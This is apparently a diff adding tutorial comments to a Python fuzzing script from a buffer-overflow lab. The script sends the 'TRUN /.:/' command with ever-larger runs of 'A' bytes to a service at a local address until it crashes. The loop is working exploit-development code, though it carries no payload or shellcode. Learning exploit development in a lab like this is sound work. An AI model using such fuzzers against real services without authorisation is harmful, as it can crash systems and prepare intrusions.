@@ -285,15 +285,30 @@ while True:
                 s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                 s.connect(('192.168.1.100', 9999))
                 
-                # Once we've connected, we will send a "TRUN" command:
+                # Once we've connected, we will send a "TRUN" command plus:  "s.send(('TRUN /.:/' + buffer))"
+                
                     # We are using TRUN because we know is the vulnerable command in this case.
                     # The registers /.:/ are the strings that the command needs to "understand" the command (those appear in the string of the Regs in Immunity Debugger)
                     # + buffer: We are adding the buffer variable "A * 100", so...
+                        
                         # WE ARE SENDING: TRUN/.:/ AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+                        
+                    # Then, we are closing the connection with "s.close()"
+                    
+                    # Then, we sleep for 1 second the program with "sleep(1)"
+                    
+                    # Finally, we add to the variable "buffer" other A*100, so now, it will send 200...
+                    
+                    # The loop repeats: 100,200,300,400,500,600... the buffer will get bigger and bigger until the program breaks.
+        # THE TRICK IS, WE ARE TRYING TO NARROW DOWN WHERE THE PROGRAM IS BREAKING AND WITH WHICH SPECIFIC BYTE SIZE.
+        # SO, WE GOING TO FUZZ IT:
+                                                        
                 s.send(('TRUN /.:/' + buffer))
                 s.close()
                 sleep(1)
                 buffer = buffer + "A"*100
+
+        # WHEN IT BREAKS, IT WILL PRINT AN EXCEPTION SHOWING EXACTLY WHERE IT CRASHED:
         
         except:
                 print "Fuzzing crashed at %s bytes" % str(len(buffer))
